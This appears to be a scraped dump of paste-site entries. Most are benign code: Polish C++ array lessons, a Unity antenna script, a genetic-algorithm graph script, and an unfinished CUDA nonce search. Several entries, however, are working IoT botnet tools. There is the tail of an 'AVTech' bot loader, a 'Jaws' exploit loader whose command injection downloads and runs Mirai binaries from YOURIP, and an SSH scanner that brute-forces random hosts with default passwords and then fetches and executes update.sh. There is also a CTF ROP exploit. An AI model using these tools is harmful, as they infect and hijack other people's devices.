print( ""[AVTech] Directing Bots Towards -> %s"" % (host_server))
for i in ips:
    i = i.strip(""\r\n"")
    info = i.split("":"")
    ip = info[0]
    port = info[1]
    proc = Thread(target=avtech, args=(num, ip, port,))
    proc.start()
    num += 1
    
print (""[AVTech] Finished Loading..."")"
JZ7rQ4Wa,Untitled,MeehoweCK,C++,Friday 10th of May 2024 11:13:55 AM CDT,"#include <iostream>

const int ROZMIAR{ 5 };

void wypelnijTablice(int* tab) {		// tablice jednowymiarowe przekazujemy do funkcji w argumencie jako [typ_zmiennej]* (z gwiazdką)
	for (auto i{ 0 }; i < ROZMIAR; ++i) {
		tab[i] = i;
	}
}

// UWAGA: tablice są przekazywane do funkcji przez referencję (przekazywany jest faktyczny obiekt, a nie tylko jego wartość)
void podwojWartosciTablicy(int* tab) {
	for (auto i{ 0 }; i < ROZMIAR; ++i) {
		tab[i] *= 2;
	}
}

void podwojWartosc(int liczba) {		// tutaj tworzona jest zmienna lokalna (!) o nazwie liczba, pobiera ona taką wartość jaką podaliśmy przy wywołaniu funkcji
	liczba *= 2;						// zmienna lokalna zwiększa swoją wartość dwukrotnie
	std::cout << liczba << std::endl;	// wypisujemy wartość zmiennej lokalnej utworzonej wewnątrz tej funkcji (jej wartość jest 2x większa niż wartość przekazana do funkcji)
}										// zmienna lokalna jest niszczona

int main() {
	int tablica[ROZMIAR];		// deklaracja tablicy bez inicjalizacji
	wypelnijTablice(tablica);

	// wypisanie na ekran wypełnionej tablicy:
	for (auto i{ 0 }; i < ROZMIAR; ++i) {
		std::cout << tablica[i] << '\t';
	}
	std::cout << std::endl;

	podwojWartosciTablicy(tablica);

	// wypisanie na ekran tablicy z podwojonymi wartościami:
	for (auto i{ 0 }; i < ROZMIAR; ++i) {
		std::cout << tablica[i] << '\t';
	}
	std::cout << std::endl;

	auto liczba{ 8 };
	std::cout << liczba << std::endl;		// wypisujemy na ekran wartość zmiennej liczba (8)
	podwojWartosc(liczba);					// wywołujemy funkcję dla wartości równej 8 (aktualna wartość zmiennej liczba)
	std::cout << liczba << std::endl;		// wypisujemy na ekran wartość zmiennej liczba (ta sama, która była przed wywołaniem funkcji, bo funkcja korzystała z jej wartości, a nie samej zmiennej)

	return 0;
}"
26a3i9cC,jaws loader,D3adG,Python,Friday 10th of May 2024 11:09:27 AM CDT,"#Jaws Exploit Loader
import random, socket, time, sys, requests, re, os
from multiprocessing import Process

if len(sys.argv) < 2:
    sys.exit(""usage: python %s <input list> <port>"" % (sys.argv[0]))

bin_names = [""arm"", ""arm4"", ""arm5""]
list = open(sys.argv[1], ""r"").readlines()
#port= sys.argv[2]

def send_payload(target, port):
    for names in bin_names:
        print(""[JAWS/1.0] attempting to infect %s with bin %s"" % (target, names))
        url = ""http://"" + target+"":60001/shell?echo >NiGGeR_ || cd /var; echo >NiGGeR_; cp /bin/busybox flakka; >flakka; chmod 777 flakka; wget http://YOURIP/binarizz/mirai.%s -O flakka; chmod 777 flakka;./flakka; rm -rf flakka >/dev/null 2>&1"" % (names)
        try:
            output = requests.get(url, timeout=3)
            if output.status_code == int('200'):
                print(""[JAWS/1.0] infected %s"" % (target))
                file_h = open(""jaws_infected.txt"", ""a+"")
                file_h.write(target + ""\n"")
                file_h.close()
                break
        except:
            pass

for i in open(sys.argv[1]).readlines():
    try:
        i = i.strip(""\r\n"")
        t = Process(target=send_payload, args=(i,port,))
        t.start()
    except KeyboardInterrupt:
        os.kill(os.getpid(), 9)
    except:
        pass"
L4jtcLC1,SSHScanner.py,D3adG,Python,Friday 10th of May 2024 11:01:54 AM CDT,"import os
import sys
import threading
from datetime import datetime
print('[!] [' + str(datetime.now().time()) + '] SSH Scanner started...')
import random
import socket
import time
try:
	import paramiko
except ImportError:
	print('[!] [' + str(datetime.now().time()) + '] You do not have paramiko installed')


global scriptName
global threads
global ranged
global timeOUT
global octets
global octet1
global octet2
global octet3

usernames = ['root', 'guest', 'support', 'admin1', 'Administrator', 'admin', 'ubnt', 'pi', 'root', 'test']

passwords = ['1234', 'root', '123456', '54321', 'test', 'support', 'password', 'pass', 'system', 'realtek', 'dreambox', '7ujMko0admin', '7ujMko0vizxv', 'anko', '1111', 'klv123', 'default', 'xmhdipc', 'ubnt', 'xc3511', 'vizxv', '888888', 'raspberry', 'guest', 'toor', '12345', 'admin', 'root1234', 'admin1234']

if len(sys.argv) < 5:
	print('    Usage: python ' + str(sys.argv[0]) + ' <threads> <range> <octets> <timeout>')
	print('Example 1: python ' + str(sys.argv[0]) + ' 4000 a 94 10')
	print('Example 2: python ' + str(sys.argv[0]) + ' 4000 b 94.102 10')
	sys.exit()

scriptName = str(sys.argv[0])
threads = str(sys.argv[1])
ranged = str(sys.argv[2])
octets = str(sys.argv[3])
timeOUT = str(sys.argv[4])


print('[!] [' + str(datetime.now().time()) + '] Threads: ' + threads)
print('[!] [' + str(datetime.now().time()) + ']   Range: ' + ranged)
print('[!] [' + str(datetime.now().time()) + ']  Octets: ' + octets)
print('[!] [' + str(datetime.now().time()) + '] timeout: ' + str(timeOUT))


def scanner(id):
	global scriptName
	global threads
	global ranged
	global octets
	global timeOUT
	global octet1
	global octet2
	global octet3
	if ranged == 'a':
		if '.' in str(octets):
			sys.exit()
		else:
			octet1 = str(octets)
	elif ranged == 'b':
		try:
			octet1, octet2 = str(octets).split('.')
		except:
			sys.exit()
	elif ranged == 'c':
		try:
			octet1, octet2, octet3 = str(octets).split('.')
		except:
			sys.exit()
	elif ranged != 'random':
		sys.exit()

	#scan
	while 1:
		try:
			output = ''
			if ranged == 'a':
				target = octet1 + '.' + str(random.randrange(0, 256)) + '.' + str(random.randrange(0, 256)) + '.' + str(random.randrange(0, 256))
			elif ranged == 'b':
				target = octet1 + '.' + octet2 + '.' + str(random.randrange(0, 256)) + '.' + str(random.randrange(0, 256))
			elif ranged == 'c':
				target = octet1 + '.' + octet2 + '.' + octet3 + '.' + str(random.randrange(0, 256))
			elif ranged == 'random':
				target =  str(random.randrange(0, 256)) + '.' + str(random.randrange(0, 256)) + '.' + str(random.randrange(0, 256)) + '.' + str(random.randrange(0, 256))
			port = 22
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.settimeout(int(timeOUT))
			try:
				sock.connect((target, port))
				print(target)
			except:
				pass
			sock.close()
			breaker = False
			for username in usernames:
				for password in passwords:
					try:
						ssh = paramiko.SSHClient()
						ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
						ssh.connect(target, port = port, username=username, password=password, timeout=10)
						ssh.close()
						breaker = True
						break
					except:
						ssh.close()
						pass
				if breaker == True:
					break
			good = False
			try:
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				ssh.connect(target, port = port, username=username, password=password, timeout=10)
				stdin, stdout, stderr = ssh.exec_command(""/sbin/ifconfig"")
				output = stdout.read()
			except:
				ssh.close()
				pass
			if 'inet' in output:
				good = True
			if good == True:
				ssh.exec_command('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://YOURIP/update.sh -O update.sh; busybox wget http://YOURIP/update.sh -O update.sh; curl http://YOURIP/update.sh -O update.sh; busybox curl http://YOURIP/update.sh -O update.sh; ftpget -v -u anonymous -p anonymous -P 21 YOURIP update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 YOURIP update.sh update.sh; chmod 777 update.sh; ./update.sh; rm -rf update.sh')
				log=open('vulnerableSSH.txt', 'a')
				log.write(target + '|' + str(username) + '|' + str(password) + '|' + str(port) + '\n')
				log.close()
				print('[!] [' + str(datetime.now().time()) + ' | ' + str(id) + '] Succeeded: ' + target + '|' + str(username) + '|' + str(password) + '|' + str(port))
				ssh.close()
		except:
			try:
				sock.close()
			except:
				closed = True
			pass


count = 0
for i in range(0, int(threads)):
	try:
		count = count + 1
		t = threading.Thread(target=scanner, args=(count ,))
		t.start()
	except:
		print('[!] [' + str(datetime.now().time()) + '] Could not start thread: ' + str(count))
print('[!] [' + str(datetime.now().time()) + '] Threads started: ' + str(count))"
v0S7i5cd,Untitled,MeehoweCK,C++,Friday 10th of May 2024 10:52:21 AM CDT,"#include <iostream>

const int ROZMIAR{ 5 };

int main() {
	int tablica[ROZMIAR]{ 1, 2, 3, 4, 5 };		// utworzenie tablicy pięcioelementowej typu int
	std::cout << tablica[2] << std::endl;	// wyświetlenie na ekran drugiego elementu tablicy (3)
	// UWAGA: elementy tablicy zawsze są numerowane od zera!!
	tablica[4] = 10;						// przypisanie wartości 10 do elementu nr 4 - teraz tablica ma wartości {1, 2, 3, 4, 10}
	auto x{ 1 };
	std::cout << tablica[x] << std::endl;	// wyświetlenie elementu tablicy o numerze x (czyli 1) - jest to wartość 2

	// wypisanie całej tablicy za pomocą pętli for:
	for (auto i{ 0 }; i < ROZMIAR; ++i) {
		std::cout << tablica[i] << '\t';
	}
	std::cout << std::endl;

	// std::cout << tablica[6] << std::endl;		// próba odczytania nieprawidłowego elementu
	return 0;
}"
eFtTgT2z,Unity Faux Physics Antenna,Skizerzz,C#,Friday 10th of May 2024 10:48:01 AM CDT,"using System.Collections.Generic;
using UnityEngine;

public class FauxPhysicsAntenna : MonoBehaviour {
    [Tooltip(""The prefab to be used for each antenna segment. Make sure the Transform of this prefab is at the base of the segment, as "" +
        ""they will spawn assuming the Transform of the object is the bottom of the segment. Childing your Mesh to an empty Transform is an easy "" +
        ""way to accomplish this."")]
    [SerializeField] private GameObject _antennaSegmentPrefab;
    [Tooltip(""OPTIONAL: In case you want something at the top of the Antenna."")]
    [SerializeField] private GameObject _antennaTopperPrefab;
    [Tooltip(""The Transform that exists in this GameObject that you want the base of the Antenna to be at."")]
    [SerializeField] private Transform _antennaBase;
    [Tooltip(""The number of AntennaSegmentPrefab's to spawn in order to create the Antenna. You can modify this range without causing any problems. "" +
        ""However, whatever this number is dictates how many iterations occur per FixedUpdate to update the Antenna Transforms."")]
    [Range(1, 20)]
    [SerializeField] private int _segmentCount;
    [Tooltip(""The maximum amount of force applied when using ApplyForce each FixedUpdate to push the Antenna around. "" +
        ""At an ApplyForce of 1, you will be applying this MaxForce amount."")]
    [Range(0f, 200f)]
    [SerializeField] private float _maxForce;
    [Tooltip(""The maximum amount of force applied when using ApplyImpulse to push the Antenna instantaneously. "" +
        ""At an ApplyImpulse of 1, you will be applying this MaxImpulseForce amount."")]
    [Range(0f, 200f)]
    [SerializeField] private float _maxImpulseForce;
    [Tooltip(""The maximum number of degrees the Antenna should bend. Experiment with this to achieve desired look. Results are visible during runtime."")]
    [Range(1, 90)]
    [SerializeField] private float _maxDegrees;
    [Tooltip(""The stiffness of the Antenna. Experiment with this to achieve desired look. Results are visible during runtime."")]
    [Range(0f, 800f)]
    [SerializeField] private float _stiffness;
    [Tooltip(""The dampening of the Antenna. Lower dampening means the Antenna will take longer to return to stationary after movement. "" +
        ""Experiment with this to achieve desired look. Results are visible during runtime."")]
    [Range(0f, 50f)]
    [SerializeField] private float _dampening;
    [Tooltip(""This is just a unique string to assign each individual AntennaSegmentPrefab so the internal Object Pool can retrieve the correct "" +
        ""pooled GameObject. Leaving this blank means the Object Pool will not be used. It's recommended you put some string value here, as "" +
        ""the Object Pool will significantly reduce Instantiation calls. (Simply put the same string "" +
        ""here on all your objects that use the same AntennaSegmentPrefab, it's just a Dictionary internally, don't overthink it.)"")]
    [SerializeField] private string _segmentIdentifier;

    private Transform[] antennaTransforms;
    private Transform topperTransform;
    private Vector2 wobblePoint = new Vector2();
    private Vector2 wobbleVelocity = new Vector2();
    private float segmentLength = 0f;
    private const string TOPPER_IDENTIFIER_SUFFIX = ""Topper"";
    private string topperIdentifier;

    private static Dictionary<string, List<GameObject>> antennaPool = new Dictionary<string, List<GameObject>>();

    void Awake() {
        if (_antennaBase == null || _antennaSegmentPrefab == null) return;

        if (string.IsNullOrEmpty(_segmentIdentifier) || string.IsNullOrWhiteSpace(_segmentIdentifier)) _segmentIdentifier = null;

        Renderer segmentRenderer = _antennaSegmentPrefab.GetComponentInChildren<Renderer>();
        Transform segmentTransform = segmentRenderer.GetComponent<Transform>();
        if(segmentRenderer == null || segmentTransform == null) {
            Debug.Log(""No Renderer and/or Transform in Antenna Segment prefab"");
            return;
        }
        Bounds segmentBounds = segmentRenderer.localBounds;
        segmentLength = segmentBounds.size.y * segmentTransform.localScale.y;
        antennaTransforms = new Transform[_segmentCount];

        for (int i = 0; i < antennaTransforms.Length; i++) {
            GameObject segmentGO = RetrievePooledGameObject(_segmentIdentifier);
            if (segmentGO == null) segmentGO = Instantiate(_antennaSegmentPrefab);
            Vector3 segmentPosition = _antennaBase.position;
            segmentPosition.y += i * segmentLength;
            segmentGO.transform.position = segmentPosition;
            antennaTransforms[i] = segmentGO.transform;
            segmentGO.transform.SetParent(_antennaBase);
        }

        if (_antennaTopperPrefab == null || _segmentIdentifier == null) return;

        topperIdentifier = _segmentIdentifier + TOPPER_IDENTIFIER_SUFFIX;
        GameObject topperGO = RetrievePooledGameObject(topperIdentifier);
        if (topperGO == null) topperGO = Instantiate(_antennaTopperPrefab);
        topperTransform = topperGO.transform;
        topperTransform.SetParent(_antennaBase);
    }


    void FixedUpdate() {
        ApplyGravityAndDampening();
        UpdateWobblePoint();
        UpdateTransforms();
    }

    public void OnDestroy() {
        if (_segmentIdentifier == null) return;
        for(int i = 0; i < antennaTransforms.Length; i++) {
            Transform current = antennaTransforms[i];
            current.SetParent(null);
        }
        PoolGameObjects(_segmentIdentifier, antennaTransforms);
        if (topperTransform == null) return;
        PoolGameObject(topperIdentifier, topperTransform);
    }

    public void ApplyImpulse(Vector3 globalDirection, float force) {
        Vector2 localizedDirection = GlobalToLocalVector(globalDirection, _antennaBase.forward);
        wobbleVelocity = ApplyImpulseToVelocity(wobbleVelocity, localizedDirection, force);
    }

    public void ApplyForce(Vector3 globalDirection, float force) {
        Vector2 localizedDirection = GlobalToLocalVector(globalDirection, _antennaBase.forward);
        wobbleVelocity = ApplyForceToVelocity(wobbleVelocity, localizedDirection, force);
    }

    private Vector2 ApplyImpulseToVelocity(Vector2 wobbleVelocity, Vector2 direction, float force) {
        force = ClampForceAmount(force);
        wobbleVelocity += direction.normalized * _maxImpulseForce * force;
        return wobbleVelocity;
    }

    private Vector2 ApplyForceToVelocity(Vector2 wobbleVelocity, Vector2 direction, float force) {
        force = ClampForceAmount(force);
        wobbleVelocity += direction.normalized * _maxForce * force * Time.fixedDeltaTime;
        return wobbleVelocity;
    }

    private Vector2 GlobalToLocalVector(Vector3 globalDirection, Vector3 globalFacingDirection) {
        Vector2 globalFacingDirectionV2 = new Vector2(globalFacingDirection.x, globalFacingDirection.z);
        float angleOffset = Vector2.SignedAngle(globalFacingDirectionV2, Vector2.up);
        globalDirection.y = 0f;
        globalDirection = Quaternion.AngleAxis(-angleOffset, Vector3.up) * globalDirection;
        return new Vector2(globalDirection.x, globalDirection.z);
    }

    private void ApplyGravityAndDampening() {
        Vector2 xGravityDirection = new Vector2(-wobblePoint.x, 0f);
        wobbleVelocity = ApplyForceAdvanced(wobbleVelocity, xGravityDirection, Mathf.Abs(wobblePoint.x), _stiffness);

        // Apply consistent gravity to push y toward 0, using _zStiffness scalar
        Vector2 yGravityDirection = new Vector2(0f, -wobblePoint.y);
        wobbleVelocity = ApplyForceAdvanced(wobbleVelocity, yGravityDirection, Mathf.Abs(wobblePoint.y), _stiffness);

        // Apply consistent force directly against the velocity vector for dampening, using _dampening scalar
        Vector2 dampeningDirection = wobbleVelocity * -1;
        wobbleVelocity = ApplyForceAdvanced(wobbleVelocity, dampeningDirection, 1f, wobbleVelocity.magnitude * _dampening);
    }

    private void UpdateWobblePoint() {
        wobblePoint += wobbleVelocity * Time.fixedDeltaTime;
        wobblePoint = ClampWobblePoint(wobblePoint);
    }

    private void UpdateTransforms() {
        float degreeTotal = _maxDegrees * wobblePoint.magnitude;
        float degreesPerSegment = degreeTotal / antennaTransforms.Length;
        float currentSegmentDegrees = degreesPerSegment;
        // rotate wobblePoint 90 degrees CCW
        Vector3 rotationVector = new Vector3(-wobblePoint.y, 0f, wobblePoint.x);
        Vector3 transformOffset = new Vector3();
        for(int i = 0; i < antennaTransforms.Length; i++) {
            Transform antennaTransform = antennaTransforms[i];
            antennaTransform.localRotation = Quaternion.AngleAxis(currentSegmentDegrees, rotationVector);
            antennaTransform.position = _antennaBase.position + transformOffset;
            transformOffset += antennaTransform.up * segmentLength;
            currentSegmentDegrees += degreesPerSegment;
        }

        if (topperTransform == null) return;
        topperTransform.localRotation = Quaternion.AngleAxis(currentSegmentDegrees, rotationVector);
        topperTransform.position = _antennaBase.position + transformOffset;
    }

    private Vector2 ApplyForceAdvanced(Vector2 wobbleVelocity, Vector2 direction, float force, float maxForce) {
        wobbleVelocity += direction.normalized * maxForce * force * Time.fixedDeltaTime;
        return wobbleVelocity;
    }

    private Vector2 ClampWobblePoint(Vector2 wobblePoint) {
        wobblePoint = Vector2.ClampMagnitude(wobblePoint, 1f);
        return wobblePoint;
    }

    private float ClampForceAmount(float forceAmount) {
        return Mathf.Clamp(forceAmount, 0.0f, 1.0f);
    }

    // POOL FUNCTIONS ========================================
    private void PoolGameObject(string identifier, Transform goTransform) {
        List<GameObject> pool;
        if(!antennaPool.TryGetValue(identifier, out pool)) {
            pool = new List<GameObject>();
            antennaPool.Add(identifier, pool);
        }

        GameObject gObject = goTransform.gameObject;
        gObject.SetActive(false);
        pool.Add(gObject);
    }

    private void PoolGameObjects(string identifier, Transform[] transforms) {
        List<GameObject> pool;
        if (!antennaPool.TryGetValue(identifier, out pool)) {
            pool = new List<GameObject>();
            antennaPool.Add(identifier, pool);
        }

        for (int i = 0; i < transforms.Length; i++) {
            GameObject gObject = transforms[i].gameObject;
            gObject.SetActive(false);
            pool.Add(gObject);
        }
    }

    private GameObject RetrievePooledGameObject(string identifier) {
        if (identifier == null) return null;
        List<GameObject> pool;
        if (!antennaPool.TryGetValue(identifier, out pool)) return null;
        if (pool.Count < 1) return null;

        GameObject GO = null;
        while(GO == null && pool.Count > 0) {
            GO = pool[pool.Count - 1];
            pool.RemoveAt(pool.Count - 1);
        }

        if (GO == null) return null;

        GO.SetActive(true);
        return GO;
    }
    // =======================================================
}"
ccfbcwK3,Untitled,MeehoweCK,C++,Friday 10th of May 2024 10:37:35 AM CDT,"#include <iostream>

int sumaDzielnikowWlasciwych(int n) {
	if (n == 1) {
		return 0;
	}
	auto wynik{ 1 };
	int i;
	for (i = 2; i * i < n; ++i) {
		if (n % i == 0) {
			wynik += (i + n / i);
		}
	}
	if (i * i == n) {
		wynik += i;
	}
	return wynik;
}

void liczbyZaprzyjaznione(int n) {
	for (auto i{ 1 }; i < n; ++i) {
		auto k{ sumaDzielnikowWlasciwych(i) };
		if (k > i && k < n) {
			if (sumaDzielnikowWlasciwych(k) == i) {
				std::cout << i << '\t' << k << std::endl;
			}
		}
	}
}

int main() {
	std::cout << ""Podaj liczbe naturalna: "";
	int n;
	std::cin >> n;
	liczbyZaprzyjaznione(n);
	return 0;
}"
Szzxpe5D,Untitled,nicoviale_,Python,Friday 10th of May 2024 10:03:25 AM CDT,"#!/usr/bin/env python3

#from cle import ELF
from pwn import *

exe = ELF(""./supermario"")

#context.terminal = ['tmux', 'splitw', '-h']
#context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], '''
            
        ''')
    else:
        r = remote(""supermario.chall.srdnlen.it"", 443, ssl=True)

    return r


def main():
    r = conn()
    rop=ROP(exe)
    #trovato con ropper
    #ropper -f supermario --search ""pop rdi""
    #0x00000000004011d3: pop rdi; ret; 

    pop_rdi = 0x4011d3
    #0xDEADBEEFDEADBEEF
    r.recvuntil(b""> "")
    payload = b""A""*40 + p64(rop.ret.address) + p64(pop_rdi) + p64(0xDEADBEEFDEADBEEF) + p64(exe.symbols['goomba']) +p64(rop.ret.address)+ p64(exe.symbols['castle'])
    r.sendline(payload)    

    
    r.interactive()


main()


""""""    r.recvuntil(b""Latitude: "") 
    r.send(b""*""*(528-8 + 1))
    canarino = r.recvline()
    canarino = chr(0).encode() + canarino[-9:-2]
    r.recvuntil(b""Longitude: "")
    r.sendline(b""*""*(272-8) + p64(int.from_bytes(canarino, 'little')) + p64(0x40138B))"""""""
1XuaFxEa,Untitled,vatman,Python,Friday 10th of May 2024 09:55:48 AM CDT,"import numpy as np
import itertools
import random
import matplotlib.pyplot as plt
import networkx as nx
from networkx.drawing.layout import fruchterman_reingold_layout

np.random.seed(4)


def data(n):

    prufer_sequence = np.random.randint(0, n, n - 2)

    G1 = nx.from_prufer_sequence(prufer_sequence)

    pos = fruchterman_reingold_layout(G1, dim=2)

    edge_points = [pos[node] for node in G1.nodes]

    vectors = []
    for point in edge_points:
        for _ in range(5):
            vectors.append(point + np.random.normal(size=2) * 0.05)
    return vectors


def visualize_graph(vectors, selected_vectors, G):
    plt.axes()
    for point in vectors:
        plt.scatter(*point, color=""b"")
    for point in selected_vectors:
        plt.scatter(*point, color=""r"")

    plt.show()


def get_zero_population_graph(data, length_population=50, graph_length=3):
    zero_population_graph = []
    for i in range(length_population):
        selected_elements = np.array(random.sample(data, graph_length))
        prufer_sequence = np.random.randint(0, graph_length, graph_length - 2)
        G1 = nx.from_prufer_sequence(prufer_sequence)
        if i == 0:
            zero_population = np.copy(selected_elements)
        else:
            zero_population = np.concatenate(
                [zero_population, selected_elements], axis=0
            )
        zero_population_graph.append(G1)

    zero_population = np.vsplit(zero_population, length_population)
    return zero_population, zero_population_graph


def calculate_vertex_energy(vertex, vectors, k):
    distances = [np.linalg.norm(vertex - vector) for vector in vectors]

    if 0.0 in distances:
        distances[distances.index(0.0)] = np.inf

    sorted_indices = np.argsort(distances)

    nearest_vector = sorted_indices[0]

    energy = 0
    energy += k * np.linalg.norm(vertex - vectors[nearest_vector]) ** 2
    return energy


def calculate_edge_energy(edge, vectors, k):
    v1, v2 = vectors[edge[0] - 1], vectors[edge[1] - 1]
    return k * np.linalg.norm(v1 - v2) ** 2


def calculate_wedge_energy(wedge, vectors, k):
    v1, v2, v3 = vectors[wedge[0] - 1], vectors[wedge[1] - 1], vectors[wedge[2] - 1]
    return k * np.linalg.norm(v1 + v3 - 2 * v2) ** 2


def fitness_function(data, points, graph):
    fitness = 0
    vertex_k = 1.0
    edge_k = 1.0
    wedge_k = 1.0
    # print(f""data: {data}\n points: {points}"")
    for node in graph.nodes:
        vertex_energy = calculate_vertex_energy(points[int(node) - 1], data, vertex_k)
        # print(f""vertex_energy: {vertex_energy}"")
        fitness += vertex_energy
    for edge in graph.edges:
        edge_energy = calculate_edge_energy(edge, points, edge_k)
        # print(f""edge_energy: {edge_energy}"")
        fitness += edge_energy
    sum_wedge_energy = 0.0
    for nodes in itertools.combinations(graph.nodes, 3):
        if graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[0], nodes[2]):
            wedge_energy = calculate_wedge_energy(
                [nodes[1], nodes[0], nodes[2]], points, wedge_k
            )
            fitness += wedge_energy
        elif graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, points, wedge_k)
            fitness += wedge_energy
        elif graph.has_edge(nodes[0], nodes[2]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(
                [nodes[1], nodes[2], nodes[0]], points, wedge_k
            )
            sum_wedge_energy += wedge_energy
    # print(f""wedge_energy: {sum_wedge_energy}"")
    fitness += sum_wedge_energy
    return 100000.0 - fitness


def get_zero_population(seed, count_population, demention_population):
    zero_population = np.random.uniform(
        -2.0, 2.0, (count_population, demention_population)
    )
    return zero_population


def get_psi(g, NP, Lambda):
    psi = ((g) * NP + 1) ** (1 / Lambda)
    return psi


def select_reference_vertor(data, clear_generation, graph, NP, g):
    reference_vector = None
    array_fitness_value = 0.0
    sum_arr = 0.0
    arr_ver = 0.0
    psi = get_psi(g, NP, 50)
    for item in range(len(clear_generation)):
        num = fitness_function(data, clear_generation[item], graph[item])

        array_fitness_value = np.append(array_fitness_value, num**psi)
        sum_arr += num**psi
    for i in array_fitness_value:
        arr_ver = np.append(arr_ver, i / sum_arr)

    # print(arr_ver)
    id = np.random.choice(len(arr_ver), p=arr_ver)
    # TODO change np.random
    reference_vector = clear_generation[id - 2]

    return reference_vector


def calculate_A(x_min, x_max, x_r, e):
    return np.arctan((x_max - x_r) / e) - np.arctan((x_min - x_r) / e)


def calculate_e(g, NP, D):
    return 1 / ((g) * (NP) + 1) ** (1 / (2 * D))


def generate_potential_offspring(x_r, e, A):
    return x_r + e * np.tan((np.random.rand() - 0.5) * A)


def sofa(zero_population, graph, data_cloud, fitness, mod, steps_number, epsilon):
    # TODO add data_cloud,fitness,mod,epsilon,true_answer
    start_population = np.copy(zero_population)
    mutant_populaion = np.copy(zero_population)
    arr_value_best_item = np.array(
        [fitness_function(data_cloud, zero_population[0], graph[0])]
    )
    value_best_item = np.copy(arr_value_best_item[0])
    best_item = None

    for item in range(steps_number):
        reference_vector = select_reference_vertor(
            data_cloud, start_population, graph, len(start_population), item
        )
        e = calculate_e(item, len(start_population), len(start_population[0]))
        for i in range(len(start_population)):
            for j in range(len(start_population[0])):
                const_a = calculate_A(-2.0, 2.0, reference_vector[j], e)
                mutant_populaion[i][j] = reference_vector[j] + np.tan(
                    (np.random.random() - 0.5)
                    * const_a
                    # 2 - D
                )

        for i in range(len(start_population)):
            fit_mutant_popul = fitness_function(data, mutant_populaion[i], graph[i])
            fit_start_popul = fitness_function(data, start_population[i], graph[i])
            if fit_mutant_popul > fit_start_popul:
                start_population[i] = mutant_populaion[i]
                if fit_mutant_popul > value_best_item:
                    value_best_item = fit_mutant_popul
                    best_item = np.copy(mutant_populaion[i])

        arr_value_best_item = np.append(arr_value_best_item, value_best_item)

    # print(f""final population: {start_population}"")
    print(f""best vector: {best_item}"")
    print(f""global maximum: {value_best_item}"")
    # print(f""fitness_changing: {arr_value_best_item}"")
    index = list(np.arange(1.0, len(arr_value_best_item) + 1, 1))
    # print(f""index = {index}"")
    # fig, ax = plt.subplots()
    # ax = plt.plot(index, arr_value_best_item)
    #
    # plt.show()
    return start_population, best_item, value_best_item


if __name__ == ""__main__"":
    # TODO optimization
    # TODO graphics
    graph_length = 3
    data = data(graph_length)
    # visualize_graph(data, None, None)
    # steps = 10000
    steps = int(input(""steps = ""))
    a, graph = get_zero_population_graph(data)
    # data = np.array([[4, 3], [5, 5], [7, 3], [3, 4], [6, 6], [7, 1]])
    # points = np.array([[4, 3], [5, 5], [7, 3]])
    # G = nx.Graph()
    # G.add_node(3)
    # G.add_edge(1, 2)
    # G.add_edge(2, 3)
    # print(fitness_function(data, points, G))

    # a = get_zero_population(1, 50, 2)
    a, item, b = sofa(a, graph, data, None, None, steps, 0.0001)
    visualize_graph(data, item, graph[0])
"
MnBbG2Cb,Untitled,aidanozo,C,Friday 10th of May 2024 09:13:18 AM CDT,"#include <stdio.h>
#include <stdint.h>
#include ""../include/utils.cuh""
#include <string.h>
#include <stdlib.h>
#include <inttypes.h>

// TODO: Implement function to search for all nonces from 1 through MAX_NONCE (inclusive) using CUDA Threads

//extern BYTE difficulty_5_zeros[SHA256_HASH_SIZE];
//extern void printResult(BYTE *block_hash, uint64_t nonce, float seconds);

BYTE *d_block_content, *d_block_hash;
uint64_t *d_nonce;

__global__ void findNonce(BYTE* block_content, size_t current_length, BYTE* block_hash, uint64_t* nonce) {

        BYTE difficulty[SHA256_HASH_SIZE] = ""0000000000000000000000000000000000000000000000000000000000000000"";
        int index = blockIdx.x * blockDim.x + threadIdx.x;

        BYTE c_block_content[BLOCK_SIZE + 30], c_block_hash[SHA256_HASH_SIZE];

        d_strcpy((char *)c_block_content, (const char *)block_content);


        if (index <= MAX_NONCE) {
                char nonce_string[NONCE_SIZE];

                intToString(index, nonce_string);
                d_strcpy((char*)c_block_content + current_length, nonce_string);

                apply_sha256(c_block_content, current_length + d_strlen(nonce_string), c_block_hash, 1);

                if (compare_hashes(c_block_hash, difficulty) <= 0){
                        //printf(""Block hash found: %s, below difficulty %s, for nonce %"" PRIu64 ""\n"", block_hash, difficulty_5_zeros, *nonce);
                        //printResult(block_hash, *nonce, 0.0);
                        //(*nonce)++;
                        *nonce = index;
                        d_strcpy((char *)block_hash, (const char *)c_block_hash);
                        return;
                }
        }
}

int main(int argc, char **argv) {
        BYTE hashed_tx1[SHA256_HASH_SIZE], hashed_tx2[SHA256_HASH_SIZE], hashed_tx3[SHA256_HASH_SIZE], hashed_tx4[SHA256_HASH_SIZE],
                        tx12[SHA256_HASH_SIZE * 2], tx34[SHA256_HASH_SIZE * 2], hashed_tx12[SHA256_HASH_SIZE], hashed_tx34[SHA256_HASH_SIZE],
                        tx1234[SHA256_HASH_SIZE * 2], top_hash[SHA256_HASH_SIZE], block_content[BLOCK_SIZE];
        BYTE block_hash[SHA256_HASH_SIZE]; // TODO: Update
        uint64_t nonce = 0; // TODO: Update
        size_t current_length;

        cudaMalloc((void**)&d_block_content, BLOCK_SIZE);
        cudaMalloc((void**)&d_block_hash, SHA256_HASH_SIZE);
        cudaMalloc((void**)&d_nonce, sizeof(uint64_t));

        // Top hash
        apply_sha256(tx1, strlen((const char*)tx1), hashed_tx1, 1);
        apply_sha256(tx2, strlen((const char*)tx2), hashed_tx2, 1);
        apply_sha256(tx3, strlen((const char*)tx3), hashed_tx3, 1);
        apply_sha256(tx4, strlen((const char*)tx4), hashed_tx4, 1);
        strcpy((char *)tx12, (const char *)hashed_tx1);
        strcat((char *)tx12, (const char *)hashed_tx2);
        apply_sha256(tx12, strlen((const char*)tx12), hashed_tx12, 1);
        strcpy((char *)tx34, (const char *)hashed_tx3);
        strcat((char *)tx34, (const char *)hashed_tx4);
